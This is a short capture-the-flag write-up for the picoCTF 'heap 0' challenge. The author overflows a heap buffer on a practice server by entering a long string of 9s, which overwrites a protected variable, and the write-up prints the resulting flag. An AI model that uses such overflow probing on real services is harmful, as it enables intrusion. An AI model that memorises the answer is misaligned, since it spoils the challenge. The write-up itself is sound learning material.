# <a href="https://play.picoctf.org/practice/challenge/438">heap 0</a>

![s12041411142024](https://a.okmd.dev/md/673599e970cdf.png)

I didn't even download to check the files, I straight away went to the instance and saw what was present in there:
```
nc tethys.picoctf.net 50823
```
```
Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5f8cd116b2b0  ->   pico
+-------------+----------------+
[*]   0x5f8cd116b2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit
```

Pretty simlpe, I cycled throught the options to see what all was present when I give the inputs:
```
Enter your choice: 1
```
```
Heap State:
```
<br><br>
```
Enter your choice: 4
```
```
Looks like everything is still secure!

No flage for you :(
```
<br><br>
```
Enter your choice: 3
```
```


Take a look at my variable: safe_var = bico


```

Then what I decided to do was open and see what was something that I could write to the buffer:
```
Enter your choice: 2
```
What I ended up doing was just simply typing too many `9`'s and seeing if that would have an impact in the buffer:
```
Data for buffer: 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
```

Then I tried printing the flag again, and sure enough, the flag was present now:
```
Enter your choice: 4
```
```
YOU WIN
picoCTF{my_first_heap_overflow_1ad0e1a6}
```

and that was the answer to the challenge...

### Answer:
```
picoCTF{my_first_heap_overflow_1ad0e1a6}
```

### References and Links:
<i>NULL</i>